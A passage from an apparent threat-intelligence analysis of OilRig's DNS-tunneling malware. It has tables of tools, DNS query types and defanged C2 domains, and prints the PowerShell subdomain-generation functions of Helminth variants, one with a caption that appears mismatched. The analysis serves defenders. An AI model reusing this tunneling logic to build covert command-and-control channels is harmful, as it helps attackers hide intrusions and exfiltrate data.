<td style="width: 70px;">Dot</td>
<td style="width: 81px;">4</td>
<td style="width: 108px;">60</td>
<td style="width: 79px;">30</td>
</tr>
<tr>
<td style="width: 125px;" rowspan="2">BONDUPDATER</td>
<td style="width: 70px;">Original</td>
<td style="width: 81px;">3</td>
<td style="width: 108px;">50</td>
<td style="width: 79px;">25</td>
<td style="width: 125px;" rowspan="2">Base16</td>
</tr>
<tr>
<td style="width: 70px;">Updated</td>
<td style="width: 81px;">186.75</td>
<td style="width: 108px;">60</td>
<td style="width: 79px;">30</td>
</tr>
<tr>
<td style="width: 201px;" colspan="2">QUADAGENT</td>
<td style="width: 81px;">16</td>
<td style="width: 108px;">60</td>
<td style="width: 79px;">45</td>
<td style="width: 125px;">Base64</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Table 1. Throughput and encoding used by OilRig&#8217;s tools using DNS tunneling</span></em></p>
<p>Another difference seen amongst the tools involves the type of DNS queries used to transmit and receive data, with each of the tools using DNS A, AAAA or TXT queries. Lastly, how the Trojan issues DNS queries differs as well. Depending on the tool, DNS queries could be issued using the built-in ‘nslookup’ application, using methods within the “UdpClient” class, using methods “GetHostByName” and “GetHostAddresses” from the ‘DNS’ class, or using the DnsQuery API functions within the ‘Dnsapi’ library.  Table 2 includes the five tools covered in this blog, which shows several different DNS query types used for the tunneling protocol and different functions used by the tools to issue the DNS requests. Also, the example C2 domain column provides the domain name once used by OilRig to host a C2 server for the associated tool.</p>
<table width="639">
<tbody>
<tr>
<td width="149"><strong>Tool</strong></td>
<td width="67"><strong>DNS Type</strong></td>
<td width="258"><strong>DNS Query method</strong></td>
<td width="164"><strong>Example C2 domain</strong></td>
</tr>
<tr>
<td width="149">Helminth</td>
<td width="67">A</td>
<td width="258">[System.Net.DNS]::GetHostByName</td>
<td width="164">go0gie[.]com</td>
</tr>
<tr>
<td width="149">ISMAgent</td>
<td width="67">AAAA</td>
<td width="258">DnsQuery_A</td>
<td width="164">ntpupdateserver[.]com</td>
</tr>
<tr>
<td width="149">ALMACommunicator</td>
<td width="67">A</td>
<td width="258">DnsQuery_W</td>
<td width="164">prosalar[.]com</td>
</tr>
<tr>
<td width="149">BONDUPDATER</td>
<td width="67">A, TXT</td>
<td width="258">[System.Net.Dns]::GetHostAddresses, System.Net.Sockets.UdpClient</td>
<td width="164">poison-frog[.]club, withyourface[.]com</td>
</tr>
<tr>
<td width="149">QUADAGENT</td>
<td width="67">AAAA</td>
<td width="258">nslookup.exe, Resolve-DnsName</td>
<td width="164">acrobatverify[.]com</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 2. DNS type and query method used by OilRig&#8217;s tools using DNS tunneling for C2</em></span></p>
<p>In the upcoming sections, we will provide an in-depth analysis of the DNS tunneling protocols used by each of OilRig’s tools.</p>
<h1>Helminth</h1>
<p>There are several variants of Helminth, as the OilRig actors actively developed this Trojan during the course of their attack campaigns. The Helminth Trojan came in two forms, a portable executable version and a PowerShell version, both of which received updates to their DNS tunneling protocol over time. The DNS tunneling protocols used in each variant operated the same way, but the developer would make changes to the generated subdomains to make them look visually different to evade detection.</p>
<p>For instance, Figures 2, 3 and 4 below show the subdomain generation function used in three variants of PowerShell Helminth, which effectively generate the subdomains with the same structure, but the first two characters differ from “00”, “zz” and “ww”. While the portable executable and PowerShell variants of Helminth generate different subdomains for their DNS tunneling, in this section we will focus on the PowerShell variant as it is easier to visualize.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692892e1b6a047751502" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function GetSub($myflag2, $cmdid='00', $partid='000')

{

if($myflag2 -eq 0)

{

('00000000'+(convertTo-Base36(Get-Random -Maximum 46655)))

}

elseif($myflag2 -eq 1)

{

('00'+$global:myid+'00000'+(convertTo-Base36(Get-Random -Maximum 46655)))

}

elseif($myflag2 -eq 2)

{

('00'+$global:myid+$cmdid+$partid+(convertTo-Base36(Get-Random -Maximum 46655)))

}

}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-2">2</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-4">4</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-6">6</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-8">8</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-10">10</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-12">12</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-14">14</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-16">16</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-18">18</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-20">20</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-22">22</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-24">24</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-26">26</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b6a047751502-28">28</div><div class="crayon-num" data-line="crayon-5f692892e1b6a047751502-29">29</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692892e1b6a047751502-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">GetSub</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">myflag2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">cmdid</span><span class="crayon-o">=</span><span class="crayon-s">'00'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">partid</span><span class="crayon-o">=</span><span class="crayon-s">'000'</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-2">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-3"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-4">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-5"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">myflag2</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-6">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-7"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-8">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-9"><span class="crayon-sy">(</span><span class="crayon-s">'00000000'</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-v">convertTo</span><span class="crayon-o">-</span><span class="crayon-e">Base36</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Random</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Maximum</span><span class="crayon-h"> </span><span class="crayon-cn">46655</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-10">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-11"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-12">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-13"><span class="crayon-st">elseif</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">myflag2</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-14">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-15"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-16">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-17"><span class="crayon-sy">(</span><span class="crayon-s">'00'</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-m">global</span><span class="crayon-o">:</span><span class="crayon-v">myid</span><span class="crayon-o">+</span><span class="crayon-s">'00000'</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-v">convertTo</span><span class="crayon-o">-</span><span class="crayon-e">Base36</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Random</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Maximum</span><span class="crayon-h"> </span><span class="crayon-cn">46655</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-18">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-19"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-20">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-21"><span class="crayon-st">elseif</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">myflag2</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-22">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-23"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-24">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-25"><span class="crayon-sy">(</span><span class="crayon-s">'00'</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-m">global</span><span class="crayon-o">:</span><span class="crayon-v">myid</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">cmdid</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">partid</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-v">convertTo</span><span class="crayon-o">-</span><span class="crayon-e">Base36</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Random</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Maximum</span><span class="crayon-h"> </span><span class="crayon-cn">46655</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-26">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-27"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b6a047751502-28">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b6a047751502-29"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 2. Code in Helminth &#8220;00&#8221; variant used to generate subdomains</em></span></p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692892e1b71771812322" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function GetSub($myflag3, $cmdid='00', $partid='000')

{

if($myflag3 -eq 0)

{

('ww000000'+(convertTo-Base36(Get-Random -Maximum 46655)))

}

elseif($myflag3 -eq 1)

{

('ww'+$global:myid+'00000'+(convertTo-Base36(Get-Random -Maximum 46655)))

}

elseif($myflag3 -eq 2)

{

('ww'+$global:myid+$cmdid+$partid+(convertTo-Base36(Get-Random -Maximum 46655)))

}

}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-2">2</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-4">4</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-6">6</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-8">8</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-10">10</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-12">12</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-14">14</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-16">16</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-18">18</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-20">20</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-22">22</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-24">24</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-26">26</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b71771812322-28">28</div><div class="crayon-num" data-line="crayon-5f692892e1b71771812322-29">29</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692892e1b71771812322-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">GetSub</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">myflag3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">cmdid</span><span class="crayon-o">=</span><span class="crayon-s">'00'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">partid</span><span class="crayon-o">=</span><span class="crayon-s">'000'</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-2">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-3"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-4">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-5"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">myflag3</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-6">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-7"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-8">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-9"><span class="crayon-sy">(</span><span class="crayon-s">'ww000000'</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-v">convertTo</span><span class="crayon-o">-</span><span class="crayon-e">Base36</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Random</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Maximum</span><span class="crayon-h"> </span><span class="crayon-cn">46655</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-10">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-11"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-12">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-13"><span class="crayon-st">elseif</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">myflag3</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-14">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-15"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-16">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-17"><span class="crayon-sy">(</span><span class="crayon-s">'ww'</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-m">global</span><span class="crayon-o">:</span><span class="crayon-v">myid</span><span class="crayon-o">+</span><span class="crayon-s">'00000'</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-v">convertTo</span><span class="crayon-o">-</span><span class="crayon-e">Base36</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Random</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Maximum</span><span class="crayon-h"> </span><span class="crayon-cn">46655</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-18">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-19"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-20">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-21"><span class="crayon-st">elseif</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">myflag3</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-22">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-23"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-24">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-25"><span class="crayon-sy">(</span><span class="crayon-s">'ww'</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-m">global</span><span class="crayon-o">:</span><span class="crayon-v">myid</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">cmdid</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">partid</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-v">convertTo</span><span class="crayon-o">-</span><span class="crayon-e">Base36</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Random</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Maximum</span><span class="crayon-h"> </span><span class="crayon-cn">46655</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-26">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-27"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b71771812322-28">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b71771812322-29"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 3. Code in Helminth &#8220;zz&#8221; variant used to generate subdomains</em></span></p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692892e1b73004755182" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function GetSub($myflag2, $cmdid='00', $partid='000')

{

if($myflag2 -eq 0)

{

('zz000000'+(convertTo-Base36(Get-Random -Maximum 46655)));

}

elseif($myflag2 -eq 1)

{

('zz'+$global:myid+'00000'+(convertTo-Base36(Get-Random -Maximum 46655)));

}

elseif($myflag2 -eq 2)

{

('zz'+$global:myid+$cmdid+$partid+(convertTo-Base36(Get-Random -Maximum 46655)));

}

}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-2">2</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-4">4</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-6">6</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-8">8</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-10">10</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-12">12</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-14">14</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-16">16</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-18">18</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-20">20</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-22">22</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-24">24</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-26">26</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b73004755182-28">28</div><div class="crayon-num" data-line="crayon-5f692892e1b73004755182-29">29</div></div>
				</td>
